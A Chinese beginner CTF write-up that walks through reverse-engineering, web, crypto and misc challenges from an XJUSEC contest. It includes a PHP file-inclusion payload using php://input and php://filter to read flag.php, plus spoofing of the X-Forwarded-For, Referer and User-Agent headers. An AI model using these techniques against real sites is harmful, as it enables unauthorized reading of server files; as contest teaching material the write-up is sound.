+                ><br> 先直接运行<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025003241691.png"
+                      alt="image-20211025003241691"
+                ><br> 让输入0-8其中一个数(0为重启游戏),数据量不大直接先从1试到8,试到8时出现flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025003453306.png"
+                      alt="image-20211025003453306"
+                ></p>
+<h3 id="3-再用IDA签一次到"><a href="#3-再用IDA签一次到" class="headerlink" title="3.再用IDA签一次到"></a>3.再用IDA签一次到</h3><p>下载得到2.exe文件,直接拖入IDA分析,找到main函数,F5反编译:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025003726712.png"
+                      alt="image-20211025003726712"
+                ><br> 双击进入check_flag()函数,得到如下代码:</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">int64 __fastcall <span class="title function_">check_flag</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 != <span class="number">120</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">106</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">117</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">123</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">unsigned</span> __int8)a1[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)result == <span class="number">66</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="type">unsigned</span> __int8)a1[<span class="number">5</span>];</span><br><span class="line">          <span class="keyword">if</span> ( (_BYTE)result == <span class="number">105</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = (<span class="type">unsigned</span> __int8)a1[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">if</span> ( (_BYTE)result == <span class="number">110</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = (<span class="type">unsigned</span> __int8)a1[<span class="number">7</span>];</span><br><span class="line">              <span class="keyword">if</span> ( (_BYTE)result == <span class="number">97</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)a1[<span class="number">8</span>];</span><br><span class="line">                <span class="keyword">if</span> ( (_BYTE)result == <span class="number">114</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">9</span>];</span><br><span class="line">                  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">121</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">10</span>];</span><br><span class="line">                    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">95</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">11</span>];</span><br><span class="line">                      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">83</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        result = (<span class="type">unsigned</span> __int8)a1[<span class="number">12</span>];</span><br><span class="line">                        <span class="keyword">if</span> ( (_BYTE)result == <span class="number">116</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          result = (<span class="type">unsigned</span> __int8)a1[<span class="number">13</span>];</span><br><span class="line">                          <span class="keyword">if</span> ( (_BYTE)result == <span class="number">97</span> )</span><br><span class="line">                          &#123;</span><br><span class="line">                            result = (<span class="type">unsigned</span> __int8)a1[<span class="number">14</span>];</span><br><span class="line">                            <span class="keyword">if</span> ( (_BYTE)result == <span class="number">110</span> )</span><br><span class="line">                            &#123;</span><br><span class="line">                              result = (<span class="type">unsigned</span> __int8)a1[<span class="number">15</span>];</span><br><span class="line">                              <span class="keyword">if</span> ( (_BYTE)result == <span class="number">100</span> )</span><br><span class="line">                              &#123;</span><br><span class="line">                                result = (<span class="type">unsigned</span> __int8)a1[<span class="number">16</span>];</span><br><span class="line">                                <span class="keyword">if</span> ( (_BYTE)result == <span class="number">95</span> )</span><br><span class="line">                                &#123;</span><br><span class="line">                                  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">17</span>];</span><br><span class="line">                                  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">85</span> )</span><br><span class="line">                                  &#123;</span><br><span class="line">                                    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">18</span>];</span><br><span class="line">                                    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">112</span> )</span><br><span class="line">                                    &#123;</span><br><span class="line">                                      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">19</span>];</span><br><span class="line">                                      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">125</span> )</span><br><span class="line">                                      &#123;</span><br><span class="line">                                        <span class="built_in">printf</span>(<span class="string">&quot;yes,this is a flag&quot;</span>);</span><br><span class="line">                                        getchar();</span><br><span class="line">                                        result = <span class="number">0</span>i64;</span><br><span class="line">                                      &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                  &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                              &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>经过分析可得程序将输入的v2字符串传到check_flag()函数的a1中,然后将a1[1]-a1[19]中的字符与一个ASCII码进行对比,若全部相等则输出yes,this is a flag. 因此判断将所有ASCII码转为字符连起来即可得到flag,实际中会得到 ju{xxxxxx},根据flag格式前面应该缺一个 x ,补上即为正确flag</p>
+<h3 id="4-Nizdy不喜欢玩游戏"><a href="#4-Nizdy不喜欢玩游戏" class="headerlink" title="4.Nizdy不喜欢玩游戏"></a>4.Nizdy不喜欢玩游戏</h3><p>下载文件FlappyflappyBird.exe,拖入IDA分析,找到main函数,F5反编译:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025004946233.png"
+                      alt="image-20211025004946233"
+                ><br> 题目说是玩到2021分就有flag,发现当score&gt;2020时会输出real[0]和src,双击这俩变量进入汇编视图查看变量内容,如图:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025005217219.png"
+                      alt="image-20211025005217219"
+                ><br> 可以很快发现src的内容与flag形式很像,猜测为凯撒密码,将其复制到凯撒密码解密器中枚举,得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025005433577.png"
+                      alt="image-20211025005433577"
+                ></p>
+<h3 id="5-easyre"><a href="#5-easyre" class="headerlink" title="5.easyre"></a>5.easyre</h3><p>下载解压得到easyre.txt,打开发现是c语言,简单分析一下:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025005923226.png"
+                      alt="image-20211025005923226"
+                ><br> 程序首先读入一个长度为21的<code>input</code>字符串,然后将input中的每个字符ASCII码减5,之后在与<code>&quot;SEPN@&gt;vR@G&gt;JH@ZOJZPNx&quot;</code>字符串进行比较,相同则输出<code>lucky!flag is your input</code>,于是编写c++语言脚本如下获得flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025010919597.png"
+                      alt="image-20211025010919597"
+                ></p>
+<hr>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><hr>
+<h3 id="1-robots"><a href="#1-robots" class="headerlink" title="1.robots"></a>1.robots</h3><p>打开题目链接直接访问robots.txt文件:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025011104880.png"
+                      alt="image-20211025011104880"
+                ><br> 根据robots内内容访问flaaaggg.php拿到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025011146021.png"
+                      alt="image-20211025011146021"
+                ></p>
+<h3 id="2-where-is-f1ag"><a href="#2-where-is-f1ag" class="headerlink" title="2.where is f1ag?"></a>2.where is f1ag?</h3><p>打开题目链接发现只有<code>FLAG is not here</code>,F12审查元素看看有没有什么提示:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025011328003.png"
+                      alt="image-20211025011328003"
+                ><br> 发现<code>flag in web.pdf</code>,访问web.pdf在最下面发现flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025011432030.png"
+                      alt="image-20211025011432030"
+                ></p>
+<h3 id="3-cookie"><a href="#3-cookie" class="headerlink" title="3.cookie"></a>3.cookie</h3><p>打开链接,根据题目提示直接F12查看cookie:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025011532460.png"
+                      alt="image-20211025011532460"
+                ><br> 发现URL编码过的flag,解码得到<code>XJUSEC&#123;you_find_C00kie!&#125;</code></p>
+<h3 id="4-get-post"><a href="#4-get-post" class="headerlink" title="4.get&amp;post"></a>4.get&amp;post</h3><p>打开题目链接发现以下PHP代码:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xju&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;xjusec&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xju&#x27;</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;xjusec&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$a</span> === <span class="string">&#x27;welcome&#x27;</span> &amp;&amp; <span class="variable">$b</span> === <span class="string">&#x27;xju&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Do you know get&amp;post?&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>简单分析可知服务器接收到一个<code>xju=welcome</code>的GET请求和<code>xjusec=xju</code>的POST请求即会执行<code>echo $flag</code>语句,按条件发送后得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025012219767.png"
+                      alt="image-20211025012219767"
+                ></p>
+<h3 id="5-绯红之王"><a href="#5-绯红之王" class="headerlink" title="5.绯红之王"></a>5.绯红之王</h3><p>打开题目链接发现有个名为<code>give me flag</code>访问地址为<code>/flag.php</code>的超级链接,点击后跳转到百度,猜测网页进行了重定向,flag就在flag.php中,于是利用linux下curl命令默认不跟随重定向的特点访问flag.php得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025012627955.png"
+                      alt="image-20211025012627955"
+                ></p>
+<h3 id="6-伪协议"><a href="#6-伪协议" class="headerlink" title="6.伪协议"></a>6.伪协议</h3><p>打开题目链接得到如下代码:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;Happy 1024&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$b</span>);  <span class="comment">//flag.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>
+
+<p>简单分析代码,当<code>file_get_contents($a,&#39;r&#39;)</code>的值等于<code>&quot;Happy 1024&quot;</code>时可以执行<code>include($b)</code>语句,flag在flag.php文件中 首先访问flag.php:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025015138723.png"
+                      alt="image-20211025015138723"
+                ><br> 发现获取不了flag,根据题目提示,该题需要使用伪协议,首先试着访问phpinfo看看可以使用哪些伪协议,发现找不到phpinfo文件(可能是我没找到),于是我先试了试php:&#x2F;&#x2F;input伪协议进行传入<code>&quot;Happy 1024&quot;</code>使file_get_contents($a,’r’)得到的值为<code>Happy 1024</code>,如图:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025014223111.png"
+                      alt="image-20211025014223111"
+                ><br> 服务器返回<code>Warning: include(): Filename cannot be empty in /var/www/html/index.php</code>错误,意思是include()函数内容不能为空,这就意味着成功执行了<code>include($b)</code>语句,因为没有传b的值而报错. 也说明php:&#x2F;&#x2F;伪协议是可以用的.接下来来传b的值通过伪协议访问flag.php. 这里使用php:&#x2F;&#x2F;filter伪协议中的read,因为要得到<strong>php文件</strong>的源码,我们要对其进行base64编码,即<code>php://filter/read=convert.base64-encode/resource=flag.php</code>得到一串base64编码的字符串:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025015702488.png"
+                      alt="image-20211025015702488"
+                ><br> 对其解码得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025015757220.png"
+                      alt="image-20211025015757220"
+                ></p>
+<h3 id="7-Do-you-know-http"><a href="#7-Do-you-know-http" class="headerlink" title="7.Do you know http?"></a>7.Do you know http?</h3><p>打开题目链接得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025015902356.png"
+                      alt="image-20211025015902356"
+                ><br> 于是使用burpsuite发送一个请求方法为<code>Ethe</code>的请求:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025020027910.png"
+                      alt="image-20211025020027910"
+                ><br> 提示”只有本地登陆才可以哦！”,然后加入X-Forwarded-For请求头,值为<code>127.0.0.1</code>:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025020244644.png"
+                      alt="image-20211025020244644"
+                ><br> 又提示”只有从<code>www.xjusec.com</code>过来的人才能看到下一步哦！”,加入Referer请求头,值为<code>www.xjusec.com</code> :<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025020511386.png"
+                      alt="image-20211025020511386"
+                ><br> 又**提示”你为什么不用’xju’这个官方浏览器！！” ,把User-Agent请求头的值改为xju得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025020612135.png"
+                      alt="image-20211025020612135"
+                ><br> 终于拿到了flag!!!!</p>
+<hr>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><hr>
+<h3 id="1-Crypto指南"><a href="#1-Crypto指南" class="headerlink" title="1.Crypto指南"></a>1.Crypto指南</h3><p>下载附件CRYPTO.pdf,拉到最下面得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025153716169.png"
+                      alt="image-20211025153716169"
+                ></p>
+<h3 id="2-社会主义核心阿弥陀佛"><a href="#2-社会主义核心阿弥陀佛" class="headerlink" title="2.社会主义核心阿弥陀佛"></a>2.社会主义核心阿弥陀佛</h3><p>下载附件得到一个txt文件,里面内容为:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">诚信自由自由友善平等友善法治敬业友善平等友善爱国公正敬业友善平等诚信民主富强友善爱国诚信平等诚信民主友善公正敬业诚信富强友善爱国公正友善平等文明敬业敬业诚信自由平等友善平等友善法治爱国诚信文明友善爱国平等敬业和谐爱国公正诚信自由爱国爱国富强友善平等公正友善爱国法治友善平等友善法治友善平等富强友善爱国公正敬业敬业友善平等友善自由诚信自由公正爱国和谐诚信民主和谐友善爱国平等敬业富强爱国敬业诚信自由平等敬业和谐爱国公正友善爱国法治诚信富强自由敬业敬业友善爱国公正爱国和谐友善平等和谐友善爱国公正友善自由文明友善平等平等友善爱国公正诚信民主友善公正友善自由友善平等友善爱国平等敬业民主敬业富强友善爱国平等友善自由自由友善平等法治友善爱国公正敬业诚信民主诚信民主富强友善爱国法治敬业诚信富强友善自由自由诚信自由敬业爱国和谐诚信民主友善法治友善爱国爱国诚信富强爱国诚信民主公正诚信自由公正爱国富强诚信富强友善敬业友善爱国平等诚信民主友善爱国敬业法治友善爱国和谐爱国富强爱国文明诚信自由自由友善平等诚信自由爱国自由诚信自由自由友善平等诚信民主友善自由平等友善爱国公正爱国富强友善自由诚信平等友善爱国公正爱国富强敬业公正友善爱国自由诚信民主诚信平等诚信民主民主诚信自由公正敬业敬业友善平等诚信富强友善爱国公正爱国敬业爱国富强诚信自由平等爱国公正诚信富强平等诚信自由平等爱国诚信民主敬业诚信和谐友善爱国自由诚信民主友善爱国爱国自由友善爱国平等友善自由诚信平等诚信富强友善平等友善爱国公正爱国富强诚信富强诚信平等诚信自由公正敬业民主友善自由敬业友善爱国法治友善自由平等敬业诚信自由诚信自由自由友善平等诚信平等诚信民主民主诚信自由平等敬业文明敬业文明友善爱国法治敬业友善自由诚信富强自由友善爱国公正诚信民主诚信文明诚信富强友善平等诚信自由公正友善平等和谐友善自由文明友善爱国法治爱国自由友善自由民主诚信自由平等诚信富强自由诚信富强法治友善爱国公正爱国和谐诚信民主和谐诚信自由公正敬业平等友善平等爱国友善爱国公正友善平等公正爱国平等诚信自由平等敬业民主敬业富强友善爱国敬业爱国文明友善自由和谐友善爱国法治友善自由友善平等敬业诚信平等诚信自由公正诚信富强文明诚信民主平等诚信自由自由友善平等诚信民主诚信富强平等诚信自由爱国爱国爱国友善自由友善公正诚信自由平等诚信民主爱国敬业诚信和谐诚信自由法治诚信民主友善法治诚信民主富强诚信自由爱国敬业爱国爱国法治友善爱国公正友善自由友善法治友善平等友善平等诚信自由公正友善自由文明诚信民主平等诚信自由法治友善平等友善爱国友善自由友善敬业友善爱国法治友善平等诚信和谐友善平等富强友善爱国敬业爱国公正诚信富强诚信平等友善爱国平等敬业民主敬业富强诚信自由自由诚信民主诚信自由敬业友善法治诚信自由法治友善平等诚信和谐诚信民主富强诚信自由平等爱国友善敬业爱国和谐诚信自由平等诚信富强平等友善自由文明诚信自由法治友善自由平等敬业友善爱国友善爱国平等友善平等诚信自由敬业法治诚信自由爱国友善自由爱国友善平等公正诚信自由公正爱国富强友善自由诚信平等诚信自由敬业敬业敬业诚信富强自由诚信自由平等友善自由平等诚信富强文明诚信自由平等友善自由敬业爱国公正友善爱国平等友善自由诚信自由诚信富强自由 </span><br></pre></td></tr></table></figure></div>
+
+<p>以前在网上瞎看的时候看到一个”核心价值观编码”,于是拿上去解码得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025154235376.png"
+                      alt="image-20211025154235376"
+                ><br> 根据题目提示和密文格式,判断是”与佛论禅”,拿上去解码得flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025154329740.png"
+                      alt="image-20211025154329740"
+                ></p>
+<h3 id="3-爱弹贝斯的Caesar"><a href="#3-爱弹贝斯的Caesar" class="headerlink" title="3.爱弹贝斯的Caesar"></a>3.爱弹贝斯的Caesar</h3><p>下载附件得到一个txt文件,内容为<code>S1dIRlJQezd1cl8yYWZqUmVfMWZfdW5lcV82Yl9ndTFheF8wNX0=</code> 根据题目”贝斯”和密文内容,猜测为base64编码,解码得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025154542804.png"
+                      alt="image-20211025154542804"
+                ><br> 发现又为一串密文,观察格式判断可能为凯撒密码,用工具枚举得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025154725298.png"
+                      alt="image-20211025154725298"
+                ></p>
+<h3 id="4-小羊跳栅栏"><a href="#4-小羊跳栅栏" class="headerlink" title="4.小羊跳栅栏"></a>4.小羊跳栅栏</h3><p>题目密文为:<code>XXJJUUSCETCF&#123;_WhEaLVCe0_MgEo_0TdO__T1i0m2e4&#125;</code>,根据题目提示猜测为栅栏密码, 用工具枚举到22得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025154922737.png"
+                      alt="image-20211025154922737"
+                ></p>
+<h3 id="5-d-￣▽￣-b"><a href="#5-d-￣▽￣-b" class="headerlink" title="5.d=(￣▽￣*)b"></a>5.d=(￣▽￣*)b</h3><p>下载附件,得到一个名为txt的文件.用notepad++打开的:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025155246508.png"
+                      alt="image-20211025155246508"
+                ><br> 发现是一堆符号组成的表情,我先到网上搜索表情密码,但是没有获得有效信息,后来不断搜索得知这种东西叫颜文字(知道这东西但用的不多,一时半会没想起来),于是又在网上搜了颜文字密码(aaencode),解密得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025155813049.png"
+                      alt="image-20211025155813049"
+                ></p>
+<h3 id="6-ROT全家桶"><a href="#6-ROT全家桶" class="headerlink" title="6.ROT全家桶"></a>6.ROT全家桶</h3><p>题目给出<code>z(wu#!LH9780h07eK4JC047;BN</code>这一串密文,根据题目提示,应该是ROT系列加密,而且不止一种,于是用工具进行解密: 首先我用ROT47解密得到<code>KWHFRP&#123;whfg_9_f6zcyr_cfjq&#125;</code>,以为接下来是凯撒密码,于是我拿去枚举,得到:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025160418568.png"
+                      alt="image-20211025160418568"
+                ><br> 将其填入flag,提示错误(黑人问号脸???), 然后仔细看了看我得到的这个flag,发现不能连成一句话,又想想题目,觉得应该不止一次ROT加密,于是又把上一步得到的字符串拿去ROT解密,接下来用ROT18解密试试:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025160737367.png"
+                      alt="image-20211025160737367"
+                ><br> 得到应该神似flag的字符串,拿去试试,成功</p>
+<h3 id="7-我emo了"><a href="#7-我emo了" class="headerlink" title="7.我emo了"></a>7.我emo了</h3><p>下载附件得emo.txt, 里面内容为<code>👏👁👌👊🐼🐺👲👜👤👦👖👦👥👣👰👖👫👟👩👜👜👖👛👜👚👦👛👠👥👞👖👤👜👫👟👦👛👪👴</code>,根据题目和文件名提示,猜测是一个与emoji有关的密码,去网上搜索,得到相关解密网站,解密得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025161103301.png"
+                      alt="image-20211025161103301"
+                ></p>
+<h3 id="8-calendar"><a href="#8-calendar" class="headerlink" title="8.calendar"></a>8.calendar</h3><p>下载附件得到一串字符串 <code>S21 F1 T12 T11 T22 M1 F1 M3</code>,根据题目提示,在网上搜索日历密码,发现以下解密方法:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025161803100.png"
+                      alt="image-20211025161803100"
+                ><br> 于是根据题中所给hint手动解密(失败好几次)得flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025161849524.png"
+                      alt="image-20211025161849524"
+                ></p>
+<h3 id="9-给我的宝剑附个魔"><a href="#9-给我的宝剑附个魔" class="headerlink" title="9.给我的宝剑附个魔"></a>9.给我的宝剑附个魔</h3><p>下载附件解压为一张图片:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025161958159.png"
+                      alt="image-20211025161958159"
+                ><br> 开始想的是图片隐写(中间写图片隐写写迷了),好久后才发现这是道密码题,在网上搜索跟我的世界附魔方面有关的密码发现有个叫”标准银河字母”的东西:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025162329783.png"
+                      alt="image-20211025162329783"
+                ><br> 然后对照得到3串字符串,刚开始不知道哪一部分是flag,交了好几个也都错了,想了一会决定拿最后一句赌一把,最后一串大致为<code>flag is standard galaxy word</code>,于是拿<code>standard galaxy word</code>转大写包上XJUSEC{}交了,成功.</p>
+<hr>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><hr>
+<h3 id="1-你是为网络安全而生的"><a href="#1-你是为网络安全而生的" class="headerlink" title="1.你是为网络安全而生的"></a>1.你是为网络安全而生的</h3><p>关注公众号即可得到flag</p>
